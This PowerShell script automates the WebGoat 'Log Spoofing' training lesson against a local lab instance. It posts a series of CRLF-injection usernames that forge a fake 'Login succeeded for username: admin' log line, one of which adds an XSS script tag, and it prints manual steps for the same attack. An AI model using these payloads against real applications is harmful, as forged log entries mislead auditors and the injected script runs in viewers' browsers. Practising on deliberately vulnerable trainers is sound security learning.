# ============================================================
# WebGoat Log Spoofing Attack
# ============================================================

$webGoatUrl = "http://192.168.254.112:8001"
$sessionCookie = "25A6B220A4CB5215EBBE7B31E207B4B1"

Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Log Spoofing Attack" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""

$headers = @{
    "Content-Type" = "application/x-www-form-urlencoded"
    "Cookie" = "JSESSIONID=$sessionCookie"
}

# Payloads to try
$payloads = @(
    @{
        name = "Basic CRLF injection"
        username = "test`r`nLogin succeeded for username: admin"
        description = "Inject newline to create fake success message"
    },
    @{
        name = "URL-encoded CRLF"
        username = "test%0D%0ALogin succeeded for username: admin"
        description = "URL-encoded newlines"
    },
    @{
        name = "LF only"
        username = "test%0ALogin succeeded for username: admin"
        description = "Unix-style newline"
    },
    @{
        name = "Double newline"
        username = "test%0D%0A%0D%0ALogin succeeded for username: admin"
        description = "Extra spacing for cleaner logs"
    },
    @{
        name = "With timestamp"
        username = "test%0D%0A[2025-12-14 10:30:45] Login succeeded for username: admin"
        description = "Make it look more realistic"
    },
    @{
        name = "Advanced - XSS injection"
        username = "test%0D%0ALogin succeeded for username: admin%0D%0A<script>alert('XSS')</script>"
        description = "Add script tag to logs (going beyond)"
    }
)

foreach ($payload in $payloads) {
    Write-Host "=====================================" -ForegroundColor Yellow
    Write-Host "[Testing] $($payload.name)" -ForegroundColor Yellow
    Write-Host "Description: $($payload.description)" -ForegroundColor Gray
    Write-Host ""
    Write-Host "Username: $($payload.username)" -ForegroundColor White
    Write-Host ""
    
    $body = "username=$($payload.username)&password=test123"
    
    try {
        $response = Invoke-WebRequest `
            -Uri "$webGoatUrl/WebGoat/LogSpoofing/log-spoofing" `
            -Method POST `
            -Headers $headers `
            -Body $body `
            -UseBasicParsing
        
        $result = $response.Content | ConvertFrom-Json
        
        Write-Host "Response:" -ForegroundColor Green
        Write-Host "  Feedback: $($result.feedback)" -ForegroundColor White
        Write-Host "  Lesson Completed: $($result.lessonCompleted)" -ForegroundColor White
        Write-Host ""
        
        if ($result.output) {
            Write-Host "Log Output:" -ForegroundColor Cyan
            Write-Host $result.output -ForegroundColor White
            Write-Host ""
        }
        
        if ($result.lessonCompleted -eq $true) {
            Write-Host "================================================" -ForegroundColor Green
            Write-Host "SUCCESS!" -ForegroundColor Green
            Write-Host "================================================" -ForegroundColor Green
            Write-Host "Winning payload: $($payload.username)" -ForegroundColor White
            Write-Host ""
            exit 0
        }
        
    } catch {
        Write-Host "[ERROR] Request failed: $_" -ForegroundColor Red
        Write-Host ""
    }
    
    Start-Sleep -Milliseconds 500
}

Write-Host ""
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Manual Testing Instructions" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "If automated testing didn't work, try manually:" -ForegroundColor White
Write-Host ""
Write-Host "1. Go to the Log Spoofing challenge page" -ForegroundColor Yellow
Write-Host ""
Write-Host "2. In the username field, enter:" -ForegroundColor Yellow
Write-Host "   test" -ForegroundColor Cyan
Write-Host "   Login succeeded for username: admin" -ForegroundColor Cyan
Write-Host "   (Press Enter after 'test' to create a newline)" -ForegroundColor Gray
Write-Host ""
Write-Host "3. Or use URL-encoded version:" -ForegroundColor Yellow
Write-Host "   test%0D%0ALogin succeeded for username: admin" -ForegroundColor Cyan
Write-Host ""
Write-Host "4. Password: (anything)" -ForegroundColor Yellow
Write-Host ""
Write-Host "5. Submit and check the red log area" -ForegroundColor Yellow
Write-Host ""
Write-Host "For advanced challenge (XSS):" -ForegroundColor Yellow
Write-Host "   test%0D%0ALogin succeeded for username: admin%0D%0A<script>alert('XSS')</script>" -ForegroundColor Cyan
Write-Host ""
